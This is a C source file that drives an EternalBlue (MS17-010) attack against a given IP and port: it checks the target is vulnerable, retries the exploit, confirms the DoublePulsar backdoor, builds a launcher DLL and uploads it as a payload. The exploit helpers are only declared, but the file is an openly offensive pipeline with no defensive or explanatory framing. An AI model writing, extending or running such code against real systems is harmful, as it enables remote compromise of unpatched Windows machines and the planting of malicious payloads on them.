#include <stdio.h>
#include "config.h"

int ms17_vuln_status(const char *ip, int port);
int EternalBlue(const char *ip, int port);
int doublepulsar_check(const char *ip, int port);
int build_launcher_dll(const char *binary_path, const char *dll_out_path);
int upload_payload(const char *ip, int port, const char *payload_path, int payload_type);

int execute_eternalblue(const char *ip, int port, const char *payload_path)
{
    int attempt;
    int exploited = 0;

    (void)payload_path;

    printf("Step 1: Checking MS17-010 vulnerability.\n");
    if (ms17_vuln_status(ip, port) <= 0) {
        printf("Step 1 failed: target is not vulnerable.\n");
        return -1;
    }

    printf("Step 2: Attempting EternalBlue exploitation.\n");
    for (attempt = 0; attempt < MAX_RETRIES; ++attempt) {
        if (EternalBlue(ip, port) == 0) {
            exploited = 1;
            break;
        }
        printf("EternalBlue attempt %d failed.\n", attempt + 1);
    }
    if (!exploited) {
        printf("Step 2 failed: all EternalBlue attempts failed.\n");
        return -2;
    }

    printf("Step 3: Checking DoublePulsar status.\n");
    if (doublepulsar_check(ip, port) <= 0) {
        printf("Step 3 failed: DoublePulsar is not active.\n");
        return -3;
    }

    printf("Step 4: Building launcher DLL.\n");
    if (build_launcher_dll(TARGET_BINARY, PAYLOAD_DLL_PATH) != 0) {
        printf("Step 4 failed: launcher DLL build failed.\n");
        return -4;
    }

    printf("Step 5: Uploading payload.\n");
    if (upload_payload(ip, port, PAYLOAD_DLL_PATH, 1) != 0) {
        printf("Step 5 failed: payload upload failed.\n");
        return -5;
    }

    printf("EternalBlue pipeline completed successfully.\n");
    return 0;
}